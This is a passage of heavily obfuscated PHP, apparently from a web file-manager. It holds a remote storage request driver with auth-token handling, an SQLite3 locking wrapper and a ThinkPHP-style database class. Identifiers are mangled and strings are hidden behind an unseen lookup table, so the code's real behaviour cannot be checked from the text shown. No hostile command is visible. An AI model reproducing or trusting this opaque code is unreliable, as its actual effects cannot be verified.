$Ù‹¬äœ¦ =& $_SERVER[€ä¾™²]; $À“­¨ò = $this->_fileLink($¿ä±ôú°); if (!$À“­¨ò) { return !1; } $ûíú÷òÔ = !1; if ($Õì¦Øà > 0) { $Â²¦İÄÚ = $üÊ‰ ¢ + $Õì¦Øà - 1; $ûíú÷òÔ = array($Ù‹¬äœ¦[1551] . $üÊ‰ ¢ . $Ù‹¬äœ¦[476] . $Â²¦İÄÚ); } $×”ÒÇÁ = url_request($À“­¨ò, $Ù‹¬äœ¦[1552], !1, $ûíú÷òÔ); return $×”ÒÇÁ[$Ù‹¬äœ¦[850]] ? $×”ÒÇÁ[$Ù‹¬äœ¦[1336]] : !1; } private function _download($½¤ıû‚, $èÆ‘Óš) { $Ãöêáğµ = $this->_fileLink($½¤ıû‚); if (!$Ãöêáğµ) { return !1; } Downloader::start($Ãöêáğµ, $èÆ‘Óš); return $èÆ‘Óš; } private function _fileLink($©· ¶, $¢ê£¥Ä = '') { $”æ·„ÖÕ =& $_SERVER[€ä¾™²]; $ÔáóŠÑÌ = $this->pathApiEncode($©· ¶); return $this->requestMakeUrl($”æ·„ÖÕ[1553], array($”æ·„ÖÕ[87] => $ÔáóŠÑÌ)) . $¢ê£¥Ä; } private function urlAuto($¹Ç÷Ú—›) { $şßø“ÃÖ =& $_SERVER[€ä¾™²]; if (!$¹Ç÷Ú—›) { return $¹Ç÷Ú—›; } $Œô…°ôÆ = parse_url($¹Ç÷Ú—›); $ª”öÙ = $¹Ç÷Ú—›; if ($this->_config[$şßø“ÃÖ[1503]] && $Œô…°ôÆ[$şßø“ÃÖ[206]] == $şßø“ÃÖ[150] && Input::check($Œô…°ôÆ[$şßø“ÃÖ[1554]], $şßø“ÃÖ[1555])) { $¹Ç÷Ú—› = $şßø“ÃÖ[218] . substr($¹Ç÷Ú—›, 7); } $ÕíšËÁ’ = $şßø“ÃÖ[1556] . rawurlencode(rtrim($this->config[$şßø“ÃÖ[1500]], $şßø“ÃÖ[8])); if (strstr($¹Ç÷Ú—›, $ÕíšËÁ’)) { $ÚíÕ¼°‰ = strstr($¹Ç÷Ú—›, $şßø“ÃÖ[76]) ? $şßø“ÃÖ[285] : $şßø“ÃÖ[76]; $¹Ç÷Ú—› = $¹Ç÷Ú—› . $ÚíÕ¼°‰ . $şßø“ÃÖ[1557] . $this->authToken; } return $¹Ç÷Ú—›; } private function request($êÉÎÒ¶Ä, $äÀº´ª) { $’·ß’ßÏ =& $_SERVER[€ä¾™²]; if (!is_array($äÀº´ª)) { $äÀº´ª = array(); } for ($ê™œ†»™ = 0; $ê™œ†»™ < 4; $ê™œ†»™++) { if (!isset($äÀº´ª[$ê™œ†»™])) { $äÀº´ª[$ê™œ†»™] = $’·ß’ßÏ[12]; } } $ÓÖ»ˆê¬ = array($’·ß’ßÏ[1550] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1550], $’·ß’ßÏ[1559] => $’·ß’ßÏ[1560], $’·ß’ßÏ[1561] => $’·ß’ßÏ[87], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[1562] => array(array($’·ß’ßÏ[87] => $äÀº´ª[0])), $’·ß’ßÏ[1563] => $äÀº´ª[1] ? $’·ß’ßÏ[91] : $’·ß’ßÏ[12])), $’·ß’ßÏ[1512] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1564], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1561] => $’·ß’ßÏ[1565], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => $äÀº´ª[0])), $’·ß’ßÏ[1566] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1567], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1561] => $’·ß’ßÏ[1568], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => $äÀº´ª[0])), $’·ß’ßÏ[1513] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1569], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1570] => $’·ß’ßÏ[1571], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => $äÀº´ª[0], $’·ß’ßÏ[169] => $äÀº´ª[1])), $’·ß’ßÏ[1489] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1489], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1570] => $’·ß’ßÏ[602], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => $äÀº´ª[0], $’·ß’ßÏ[169] => $äÀº´ª[1], $’·ß’ßÏ[1527] => $äÀº´ª[2])), $’·ß’ßÏ[1490] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1490], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1570] => $’·ß’ßÏ[602], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => $äÀº´ª[0], $’·ß’ßÏ[1527] => $äÀº´ª[2])), $’·ß’ßÏ[648] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1572], $’·ß’ßÏ[1559] => $’·ß’ßÏ[1573], $’·ß’ßÏ[1570] => $’·ß’ßÏ[1574], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[1562] => array(array($’·ß’ßÏ[87] => $äÀº´ª[0])), $’·ß’ßÏ[87] => $äÀº´ª[1], $’·ß’ßÏ[1527] => $äÀº´ª[2])), $’·ß’ßÏ[650] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1575], $’·ß’ßÏ[1559] => $’·ß’ßÏ[1573], $’·ß’ßÏ[1570] => $’·ß’ßÏ[1574], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[1562] => array(array($’·ß’ßÏ[87] => $äÀº´ª[0])), $’·ß’ßÏ[87] => $äÀº´ª[1], $’·ß’ßÏ[1527] => $äÀº´ª[2])), $’·ß’ßÏ[1277] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1576], $’·ß’ßÏ[1559] => $’·ß’ßÏ[1560], $’·ß’ßÏ[1561] => $’·ß’ßÏ[87], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[1562] => array(array($’·ß’ßÏ[87] => $äÀº´ª[0])))), $’·ß’ßÏ[1493] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1577], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1570] => $’·ß’ßÏ[602], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => $äÀº´ª[0], $’·ß’ßÏ[1578] => $äÀº´ª[1])), $’·ß’ßÏ[108] => array($’·ß’ßÏ[1558] => $’·ß’ßÏ[1517], $’·ß’ßÏ[1559] => $’·ß’ßÏ[87], $’·ß’ßÏ[1570] => $’·ß’ßÏ[602], $’·ß’ßÏ[1299] => array($’·ß’ßÏ[87] => get_path_father($äÀº´ª[0]), $’·ß’ßÏ[231] => $äÀº´ª[1] ? $’·ß’ßÏ[1342] . $äÀº´ª[1] : $’·ß’ßÏ[12], $’·ß’ßÏ[32] => get_path_this($äÀº´ª[0]), $’·ß’ßÏ[1527] => $äÀº´ª[2]))); $£÷Œú—³ = $ÓÖ»ˆê¬[$êÉÎÒ¶Ä]; if (!$£÷Œú—³) { return !1; } $§Ù“Ö·‰ = $£÷Œú—³[$’·ß’ßÏ[1299]]; $¤õèæşÏ = explode($’·ß’ßÏ[50], $£÷Œú—³[$’·ß’ßÏ[1559]]); foreach ($¤õèæşÏ as $÷‹Å°İ») { $–³ƒæâÙ = $this->pathApiEncode(_get($§Ù“Ö·‰, $÷‹Å°İ»)); array_set_value($§Ù“Ö·‰, $÷‹Å°İ», $–³ƒæâÙ); } if ($êÉÎÒ¶Ä == $’·ß’ßÏ[1493] && trim($£÷Œú—³[$’·ß’ßÏ[1299]][$’·ß’ßÏ[87]], $’·ß’ßÏ[8]) == trim($this->_config[$’·ß’ßÏ[1300]], $’·ß’ßÏ[8])) { return $£÷Œú—³[$’·ß’ßÏ[1299]][$’·ß’ßÏ[87]]; } $íÉ¹Áış = $this->requestSend($£÷Œú—³[$’·ß’ßÏ[1558]], $§Ù“Ö·‰); if (!$íÉ¹Áış) { return !1; } $ïî¨öòä = $íÉ¹Áış[$’·ß’ßÏ[1336]]; if ($£÷Œú—³[$’·ß’ßÏ[1570]]) { $ïî¨öòä = _get($íÉ¹Áış, $£÷Œú—³[$’·ß’ßÏ[1570]]); } if (is_string($ïî¨öòä) && !$£÷Œú—³[$’·ß’ßÏ[1561]]) { return $this->pathApiDecode($ïî¨öòä); } if (!is_array($ïî¨öòä) || !$ïî¨öòä) { return $ïî¨öòä; } $¨´ŠÍ° = explode($’·ß’ßÏ[50], $£÷Œú—³[$’·ß’ßÏ[1561]]); foreach ($¨´ŠÍ° as $÷‹Å°İ») { $åüŞŸ‡ë = explode($’·ß’ßÏ[10], $÷‹Å°İ»); $öÍä“Åò = array_search($’·ß’ßÏ[1579], $åüŞŸ‡ë); if ($öÍä“Åò === !1) { $–³ƒæâÙ = $this->pathApiDecode(_get($ïî¨öòä, $÷‹Å°İ»)); array_set_value($ïî¨öòä, $÷‹Å°İ», $–³ƒæâÙ); if ($êÉÎÒ¶Ä == $’·ß’ßÏ[1550] && $÷‹Å°İ» == $’·ß’ßÏ[87]) { $this->pathInfoParse($ïî¨öòä); } if ($êÉÎÒ¶Ä == $’·ß’ßÏ[1512] && $÷‹Å°İ» == $’·ß’ßÏ[1580]) { $this->pathInfoParse($ïî¨öòä[$’·ß’ßÏ[1487]]); } if ($êÉÎÒ¶Ä == $’·ß’ßÏ[1512]) { $ïî¨öòä[$’·ß’ßÏ[1581]] = array(); } continue; } $ä•µ—­ü = implode($’·ß’ßÏ[10], array_slice($åüŞŸ‡ë, $öÍä“Åò + 1)); $È–ä¨È· = array(); if ($öÍä“Åò === 0) { $È–ä¨È· =& $ïî¨öòä; } if ($öÍä“Åò === 1) { $È–ä¨È· =& $ïî¨öòä[$åüŞŸ‡ë[0]]; } if ($öÍä“Åò === 2) { $È–ä¨È· =& $ïî¨öòä[$åüŞŸ‡ë[0]][$åüŞŸ‡ë[1]]; } foreach ($È–ä¨È· as $÷‹Å°İ» => $×·Ì—„Ø) { $–³ƒæâÙ = $this->pathApiDecode(_get($×·Ì—„Ø, $ä•µ—­ü)); array_set_value($È–ä¨È·[$÷‹Å°İ»], $ä•µ—­ü, $–³ƒæâÙ); $this->pathInfoParse($È–ä¨È·[$÷‹Å°İ»]); } unset($È–ä¨È·); } return $ïî¨öòä; } private function requestMakeUrl($ï¡ßûÌ€, $¯ÕÑƒÄÔ = '') { $şÃ‡Š¸ =& $_SERVER[€ä¾™²]; $…œÚµ‚× = $this->_config; if (!$this->authToken) { return !1; } $Ø÷Ûú” = $this->requestQuery($¯ÕÑƒÄÔ, !0) . $şÃ‡Š¸[1582] . $this->authToken; $¬×°ÍÆ = rtrim($…œÚµ‚×[$şÃ‡Š¸[587]][$şÃ‡Š¸[1529]], $şÃ‡Š¸[8]) . $şÃ‡Š¸[1583] . $ï¡ßûÌ€; return $¬×°ÍÆ . $şÃ‡Š¸[1584] . rawurlencode($…œÚµ‚×[$şÃ‡Š¸[587]][$şÃ‡Š¸[1501]]) . $Ø÷Ûú”; } private function requestAuthToken() { $ó¡§“Š =& $_SERVER[€ä¾™²]; $¦‡üñ•É = $this->_config; if (!$¦‡üñ•É) { return !1; } $¿’‰Æ£ñ = _get($¦‡üñ•É, $ó¡§“Š[1585]); $ª¯ØôÑÙ = array_find_by_field($¦‡üñ•É[$ó¡§“Š[587]][$ó¡§“Š[1541]], $ó¡§“Š[1586], $¿’‰Æ£ñ); if (!$ª¯ØôÑÙ) { return !1; } $ö§õßå’ = $ª¯ØôÑÙ[$ó¡§“Š[1587]] . $ó¡§“Š[1588] . $ª¯ØôÑÙ[$ó¡§“Š[1290]]; $¼ùÇÃú = $ó¡§“Š[1589] . $this->pathParse[$ó¡§“Š[486]] . $ó¡§“Š[476] . $ö§õßå’; $ê–‘¨Ò‡ = Cache::get($¼ùÇÃú); if ($ê–‘¨Ò‡) { return $ê–‘¨Ò‡; } $ê–‘¨Ò‡ = Mcrypt::encode($ö§õßå’, $ó¡§“Š[1590]); Cache::set($¼ùÇÃú, $ê–‘¨Ò‡, 3600 * 24 * 60); return $ê–‘¨Ò‡; } private function requestQuery($†ô€âºÌ = '', $ËèçÈ¹ = false) { if (!$†ô€âºÌ || !is_array($†ô€âºÌ)) { return $†ô€âºÌ; } foreach ($†ô€âºÌ as $ÙâéÀØê => $ûíã×„) { if (is_array($ûíã×„)) { $†ô€âºÌ[$ÙâéÀØê] = json_encode($ûíã×„); } } return $ËèçÈ¹ ? $_SERVER[€ä¾™²][285] . http_build_query($†ô€âºÌ) : $†ô€âºÌ; } private function requestSend($àäñù‰, $„»×ª„°) { $Á³›•â =& $_SERVER[€ä¾™²]; $œÄÁÍîÇ = $this->requestMakeUrl($àäñù‰); if (!$œÄÁÍîÇ) { return !1; } $±¨•æ³ = url_request($œÄÁÍîÇ, $Á³›•â[289], $this->requestQuery($„»×ª„°), !1, !1, !0); $ö‹ä€ş” = $±¨•æ³[$Á³›•â[1336]]; if (!is_array($ö‹ä€ş”) || !$ö‹ä€ş” || !$ö‹ä€ş”[$Á³›•â[1346]] || intval($ö‹ä€ş”[$Á³›•â[1346]]) > 500) { $×şĞ¼ñè = is_array($ö‹ä€ş”) ? $ö‹ä€ş”[$Á³›•â[1336]] : $ö‹ä€ş” . $Á³›•â[12]; if (!$±¨•æ³[$Á³›•â[850]]) { $×şĞ¼ñè .= $Á³›•â[1591] . $±¨•æ³[$Á³›•â[1346]] . $Á³›•â[176]; } IO::errorTips($×şĞ¼ñè, !1); return !1; } return $ö‹ä€ş”; } } goto d¯Ş¹™†; EåÎÖÄÏ´: class DbSqlite3 extends DbSqlite3Base { public function query($È“µêªß) { $¹õ’©È… =& $_SERVER[€ä¾™²]; if (!CacheLock::fileLock($¹õ’©È…[13])) { return !1; } $ç‡Ò½«Š = parent::query($È“µêªß); CacheLock::fileUnLock($¹õ’©È…[13]); return $ç‡Ò½«Š; } public function execute($ğ¢àóäô) { $îÄÛëşÒ =& $_SERVER[€ä¾™²]; if (!CacheLock::fileLock($îÄÛëşÒ[13])) { return !1; } $‚¾Ë¿û = parent::execute($ğ¢àóäô); CacheLock::fileUnLock($îÄÛëşÒ[13]); return $‚¾Ë¿û; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\164\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\x3d", "\156\145\x71" => "\74\x3e", "\x67\x74" => "\x3e", "\145\x67\164" => "\x3e\75", "\x6c\164" => "\74", "\145\154\x74" => "\74\x3d", "\156\157\164\x6c\x69\153\145" => "\116\117\x54\40\114\x49\x4b\x45", "\x6c\151\x6b\145" => "\x4c\111\x4b\x45", "\x69\156" => "\111\x4e", "\x6e\157\164\x69\x6e" => "\x4e\117\124\x20\111\116", "\156\157\x74\x20\151\x6e" => "\x4e\x4f\124\40\x49\x4e", "\142\x65\164\167\x65\145\156" => "\102\105\x54\127\105\105\x4e", "\x6e\157\164\x62\x65\164\167\x65\145\x6e" => "\x4e\117\x54\40\102\x45\124\x57\x45\x45\116", "\x6e\157\164\40\142\145\x74\167\x65\145\x6e" => "\116\117\124\40\x42\x45\124\x57\105\105\116"); protected $selectSql = "\x53\105\x4c\x45\103\124\45\x44\x49\123\124\111\x4e\x43\124\45\40\x25\x46\111\105\114\104\x25\x20\106\122\x4f\115\x20\x25\x54\101\102\114\x45\x25\x25\112\x4f\111\116\x25\45\x57\x48\x45\122\x45\45\45\x47\122\117\x55\x50\45\x25\110\101\x56\111\x4e\x47\45\45\117\x52\104\105\x52\45\45\114\x49\x4d\x49\124\x25\x20\x25\125\116\x49\x4f\x4e\x25\x25\103\117\115\115\x45\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $†ÛÔš = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[€ä¾™²][1073], $†ÛÔš); } public function factory($„ìâ”•Œ = '') { $Áù ¦õÕ =& $_SERVER[€ä¾™²]; $„ìâ”•Œ = $this->parseConfig($„ìâ”•Œ); if (empty($„ìâ”•Œ[$Áù ¦õÕ[1074]])) { think_exception(think_lang($Áù ¦õÕ[1075])); } $this->dbType = ucwords(strtolower($„ìâ”•Œ[$Áù ¦õÕ[1074]])); $é€¾óà× = $Áù ¦õÕ[1076] . $this->dbType; if (class_exists($é€¾óà×)) { $«ª¥È“â = new $é€¾óà×($„ìâ”•Œ); if ($Áù ¦õÕ[1077] != strtolower($„ìâ”•Œ[$Áù ¦õÕ[1074]])) { $«ª¥È“â->dbType = strtoupper($this->dbType); } else { $«ª¥È“â->dbType = $this->_getDsnType($„ìâ”•Œ[$Áù ¦õÕ[1029]]); } } else { think_exception(think_lang($Áù ¦õÕ[1078]) . $Áù ¦õÕ[1079] . $é€¾óà×); } return $«ª¥È“â; } public function __call($¬—Â«î¶, $ÃÜÊºĞ) { if (method_exists($this, $¬—Â«î¶)) { return call_user_func_array(array($this, $¬—Â«î¶), $ÃÜÊºĞ); } } protected function _getDsnType($ ùÀÈ¨œ) { $›Şš»å¤ = explode($_SERVER[€ä¾™²][4], $ ùÀÈ¨œ); $ëŒâïÛÓ = strtoupper(trim($›Şš»å¤[0])); return $ëŒâïÛÓ; } private function parseConfig($ú •âÙ± = '') { $¿ËÓµÆ =& $_SERVER[€ä¾™²]; if (!empty($ú •âÙ±) && is_string($ú •âÙ±)) { $ú •âÙ± = $this->parseDSN($ú •âÙ±); } elseif (is_array($ú •âÙ±)) { $ú •âÙ± = array_change_key_case($ú •âÙ±); $ú •âÙ± = array($¿ËÓµÆ[1074] => $ú •âÙ±[$¿ËÓµÆ[1080]], $¿ËÓµÆ[998] => $ú •âÙ±[$¿ËÓµÆ[1081]], $¿ËÓµÆ[999] => $ú •âÙ±[$¿ËÓµÆ[1082]], $¿ËÓµÆ[996] => $ú •âÙ±[$¿ËÓµÆ[1083]], $¿ËÓµÆ[997] => $ú •âÙ±[$¿ËÓµÆ[1084]], $¿ËÓµÆ[21] => $ú •âÙ±[$¿ËÓµÆ[1085]], $¿ËÓµÆ[1029] => $ú •âÙ±[$¿ËÓµÆ[1086]], $¿ËÓµÆ[17] => isset($ú •âÙ±[$¿ËÓµÆ[1087]]) ? $ú •âÙ±[$¿ËÓµÆ[1087]] : array()); } elseif (empty($ú •âÙ±)) { if (think_config($¿ËÓµÆ[1088]) && $¿ËÓµÆ[1077] != strtolower(think_config($¿ËÓµÆ[1089]))) { $ú •âÙ± = $this->parseDSN(think_config($¿ËÓµÆ[1088])); } else { $ú •âÙ± = array($¿ËÓµÆ[1074] => think_config($¿ËÓµÆ[1089]), $¿ËÓµÆ[998] => think_config($¿ËÓµÆ[1090]), $¿ËÓµÆ[999] => think_config($¿ËÓµÆ[1091]), $¿ËÓµÆ[996] => think_config($¿ËÓµÆ[1092]), $¿ËÓµÆ[997] => think_config($¿ËÓµÆ[1093]), $¿ËÓµÆ[21] => think_config($¿ËÓµÆ[324]), $¿ËÓµÆ[1029] => think_config($¿ËÓµÆ[1088]), $¿ËÓµÆ[17] => think_config($¿ËÓµÆ[1094])); } } return $ú •âÙ±; } protected function initConnect($è…¡±Î“ = true) { if (1 == think_config($_SERVER[€ä¾™²][22])) { $this->_linkID = $this->multiConnect($è…¡±Î“); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $àŒÓä => $¶‡ñÁ©) { $this->_linkID = $¶‡ñÁ©; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($»³ÖË‡ = false) { $ùÉóü£• =& $_SERVER[€ä¾™²]; static $Ó´ËŠ¿ç = array(); static $ª ƒÀ¬Ø = -1; if (empty($Ó´ËŠ¿ç)) { foreach ($this->config as $¸Óåä†· => $Ó’®­Ë) { $Ó´ËŠ¿ç[$¸Óåä†·] = explode($ùÉóü£•[50], $Ó’®­Ë); } } if (think_config($ùÉóü£•[1095])) { if ($»³ÖË‡ || think_config($ùÉóü£•[485]) === !0) { $ìäÙ©ßĞ = floor(mt_rand(0, think_config($ùÉóü£•[1096]) - 1)); $ª ƒÀ¬Ø = $ìäÙ©ßĞ; } else { if (is_numeric(think_config($ùÉóü£•[1097]))) { $ìäÙ©ßĞ = think_config($ùÉóü£•[1097]); } else { $ìäÙ©ßĞ = floor(mt_rand(think_config($ùÉóü£•[1096]), count($Ó´ËŠ¿ç[$ùÉóü£•[996]]) - 1)); } } } else { $ìäÙ©ßĞ = floor(mt_rand(0, count($Ó´ËŠ¿ç[$ùÉóü£•[996]]) - 1)); $ª ƒÀ¬Ø = $ìäÙ©ßĞ; } $ìäÙ©ßĞ = $ª ƒÀ¬Ø !== -1 ? $ª ƒÀ¬Ø : $ìäÙ©ßĞ; $¸Ì°€ñ = array($ùÉóü£•[998] => isset($Ó´ËŠ¿ç[$ùÉóü£•[998]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[998]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[998]][0], $ùÉóü£•[999] => isset($Ó´ËŠ¿ç[$ùÉóü£•[999]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[999]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[999]][0], $ùÉóü£•[996] => isset($Ó´ËŠ¿ç[$ùÉóü£•[996]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[996]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[996]][0], $ùÉóü£•[997] => isset($Ó´ËŠ¿ç[$ùÉóü£•[997]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[997]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[997]][0], $ùÉóü£•[21] => isset($Ó´ËŠ¿ç[$ùÉóü£•[21]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[21]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[21]][0], $ùÉóü£•[1029] => isset($Ó´ËŠ¿ç[$ùÉóü£•[1029]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[1029]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[1029]][0], $ùÉóü£•[17] => isset($Ó´ËŠ¿ç[$ùÉóü£•[17]][$ìäÙ©ßĞ]) ? $Ó´ËŠ¿ç[$ùÉóü£•[17]][$ìäÙ©ßĞ] : $Ó´ËŠ¿ç[$ùÉóü£•[17]][0]); return $this->connect($¸Ì°€ñ, $ìäÙ©ßĞ); } public function parseDSN($ì•ààô) { $şáëæ =& $_SERVER[€ä¾™²]; if (empty($ì•ààô)) { return !1; } $ôúº¸ÅÁ = parse_url($ì•ààô); if ($ôúº¸ÅÁ[$şáëæ[206]]) { $–ª¨€Œ‘ = array($şáëæ[1074] => $ôúº¸ÅÁ[$şáëæ[206]], $şáëæ[998] => isset($ôúº¸ÅÁ[$şáëæ[691]]) ? $ôúº¸ÅÁ[$şáëæ[691]] : $şáëæ[12], $şáëæ[999] => isset($ôúº¸ÅÁ[$şáëæ[1098]]) ? $ôúº¸ÅÁ[$şáëæ[1098]] : $şáëæ[12], $şáëæ[996] => isset($ôúº¸ÅÁ[$şáëæ[207]]) ? $ôúº¸ÅÁ[$şáëæ[207]] : $şáëæ[12], $şáëæ[997] => isset($ôúº¸ÅÁ[$şáëæ[208]]) ? $ôúº¸ÅÁ[$şáëæ[208]] : $şáëæ[12], $şáëæ[21] => isset($ôúº¸ÅÁ[$şáëæ[87]]) ? substr($ôúº¸ÅÁ[$şáëæ[87]], 1) : $şáëæ[12]); } else { preg_match($şáëæ[1099], trim($ì•ààô), $¾æ¬¥Ï»); $–ª¨€Œ‘ = array($şáëæ[1074] => $¾æ¬¥Ï»[1], $şáëæ[998] => $¾æ¬¥Ï»[2], $şáëæ[999] => $¾æ¬¥Ï»[3], $şáëæ[996] => $¾æ¬¥Ï»[4], $şáëæ[997] => $¾æ¬¥Ï»[5], $şáëæ[21] => $¾æ¬¥Ï»[6]); } $–ª¨€Œ‘[$şáëæ[1029]] = $şáëæ[12]; return $–ª¨€Œ‘; } protected function debug() { $ÃŸÁ®»€ =& $_SERVER[€ä¾™²]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÃŸÁ®»€[1100]; if (think_config($ÃŸÁ®»€[1101])) { think_status($ÃŸÁ®»€[1102]); think_trace($this->queryStr . $ÃŸÁ®»€[1103] . think_status($ÃŸÁ®»€[24], $ÃŸÁ®»€[1102], 6) . $ÃŸÁ®»€[1104], $ÃŸÁ®»€[12], $ÃŸÁ®»€[1105]); } } protected function parseLock($Ìª•ÚÓ = false) { $ÔÏÄ˜øä =& $_SERVER[€ä¾™²]; if (!$Ìª•ÚÓ) { return $ÔÏÄ˜øä[12]; } if ($ÔÏÄ˜øä[1031] == $this->dbType) { return $ÔÏÄ˜øä[1106]; } return $ÔÏÄ˜øä[1107]; } protected function parseSet($ÓÍıûö) { $ı«ÜÔ©¾ =& $_SERVER[€ä¾™²]; foreach ($ÓÍıûö as $À›È÷šì => $ö·Ù‚ÏÚ) { if (is_array($ö·Ù‚ÏÚ) && $ı«ÜÔ©¾[373] == $ö·Ù‚ÏÚ[0]) { $óœšŠƒ[] = $this->parseKey($À›È÷šì) . $ı«ÜÔ©¾[464] . $ö·Ù‚ÏÚ[1]; } elseif (is_scalar($ö·Ù‚ÏÚ) || is_null($ö·Ù‚ÏÚ)) { $óœšŠƒ[] = $this->parseKey($À›È÷šì) . $ı«ÜÔ©¾[464] . $this->parseValue($ö·Ù‚ÏÚ); } } return $ı«ÜÔ©¾[1108] . implode($ı«ÜÔ©¾[50], $óœšŠƒ); } protected function bindParam($èä„É¿Ô, $ïÕû†¼Í) { $this->bind[$_SERVER[€ä¾™²][4] . $èä„É¿Ô] = $ïÕû†¼Í; } protected function parseBind($¢ÔÆÈü) { $¢ÔÆÈü = array_merge($this->bind, $¢ÔÆÈü); $this->bind = array(); return $¢ÔÆÈü; } function parseKey(&$ĞÁïæ§, $Ìë¤Óô« = true) { if ($Ìë¤Óô«) { $ĞÁïæ§ = $this->parseKeyCheck($ĞÁïæ§); } return $ĞÁïæ§; } function parseKeyCheck($¬Ì²Š›®) { $©¥’¼İû =& $_SERVER[€ä¾™²]; $¬Ì²Š›® = trim($¬Ì²Š›®); if (!preg_match($©¥’¼İû[1109], $¬Ì²Š›®)) { think_exception($©¥’¼İû[1110] . $¬Ì²Š›®); } return $¬Ì²Š›®; } protected function parseValue($¤Ò¦ğ¤) { $‹ƒø÷“Î =& $_SERVER[€ä¾™²]; if (is_string($¤Ò¦ğ¤)) { $¤Ò¦ğ¤ = $‹ƒø÷“Î[1070] . $this->escapeString($¤Ò¦ğ¤) . $‹ƒø÷“Î[1070]; } elseif (isset($¤Ò¦ğ¤[0]) && is_string($¤Ò¦ğ¤[0]) && strtolower($¤Ò¦ğ¤[0]) == $‹ƒø÷“Î[373]) { $¤Ò¦ğ¤ = $this->escapeString($¤Ò¦ğ¤[1]); } elseif (is_array($¤Ò¦ğ¤)) { $¤Ò¦ğ¤ = array_map(array($this, $‹ƒø÷“Î[1071]), $¤Ò¦ğ¤); } elseif (is_bool($¤Ò¦ğ¤)) { $¤Ò¦ğ¤ = $¤Ò¦ğ¤ ? $‹ƒø÷“Î[91] : $‹ƒø÷“Î[229]; } elseif (is_null($¤Ò¦ğ¤)) { $¤Ò¦ğ¤ = $‹ƒø÷“Î[104]; } return $¤Ò¦ğ¤; } protected function parseField($ŞÉäŸŞü) { $Œñ…òì =& $_SERVER[€ä¾™²]; if (is_string($ŞÉäŸŞü) && strpos($ŞÉäŸŞü, $Œñ…òì[50])) { $ŞÉäŸŞü = explode($Œñ…òì[50], $ŞÉäŸŞü); } if (is_array($ŞÉäŸŞü)) { $¥„ö¼‚É = array(); foreach ($ŞÉäŸŞü as $™¸ï“ìÍ => $­òèîˆ¬) { if (!is_numeric($™¸ï“ìÍ)) { $¥„ö¼‚É[] = $this->parseKey($™¸ï“ìÍ, !1) . $Œñ…òì[1111] . $this->parseKey($­òèîˆ¬); } else { $¥„ö¼‚É[] = $this->parseKey($­òèîˆ¬); } } $¼’¡¿À’ = implode($Œñ…òì[50], $¥„ö¼‚É); } elseif (is_string($ŞÉäŸŞü) && !empty($ŞÉäŸŞü)) { $¼’¡¿À’ = $ŞÉäŸŞü; } else { $¼’¡¿À’ = $Œñ…òì[221]; } return $¼’¡¿À’; } protected function parseTable($ôÕ»çÚ) { $Ù²”ˆÑ½ =& $_SERVER[€ä¾™²]; if (is_array($ôÕ»çÚ)) { $Àºª€—‡ = array(); foreach ($ôÕ»çÚ as $ØÌ‘ì³­ => $ÓöÖÓ€) { if (!is_numeric($ØÌ‘ì³­)) { $Àºª€—‡[] = $this->parseKey($ØÌ‘ì³­) . $Ù²”ˆÑ½[53] . $this->parseKey($ÓöÖÓ€); } else { $Àºª€—‡[] = $this->parseKey($ØÌ‘ì³­); } } $ôÕ»çÚ = $Àºª€—‡; } elseif 